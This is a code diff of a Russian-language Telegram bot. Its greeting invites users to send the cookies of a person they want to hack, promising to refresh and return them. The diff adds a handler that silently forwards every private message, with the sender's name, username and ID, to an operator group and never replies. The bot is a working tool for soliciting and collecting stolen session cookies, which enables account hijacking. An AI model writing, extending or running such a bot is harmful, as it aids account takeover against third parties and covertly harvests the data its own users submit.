@@ -16,11 +16,27 @@ def start_command(message):
         "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪"
     )
     try:
-        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
+        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}\nИмя: {message.from_user.first_name}")
     except Exception as e:
         print(f"Ошибка отправки в группу: {e}")
 
-# Убираем обработчик для всех сообщений - бот будет игнорировать всё кроме /start
+@bot.message_handler(func=lambda message: True)
+def handle_all_messages(message):
+    # Игнорируем сообщения из групп
+    if message.chat.type != 'private':
+        return
+    
+    # Пересылаем все сообщения в группу, но не отвечаем пользователю
+    try:
+        bot.send_message(
+            GROUP_ID, 
+            f"📩 Сообщение от: {message.from_user.first_name} (@{message.from_user.username})\n"
+            f"ID: {message.from_user.id}\n"
+            f"Текст: {message.text}"
+        )
+        print(f"✅ Сообщение переслано в группу: {message.text}")
+    except Exception as e:
+        print(f"❌ Ошибка отправки в группу: {e}")
 
 print("🚀 Бот запущен и готов к работе!")
 bot.polling(none_stop=True)
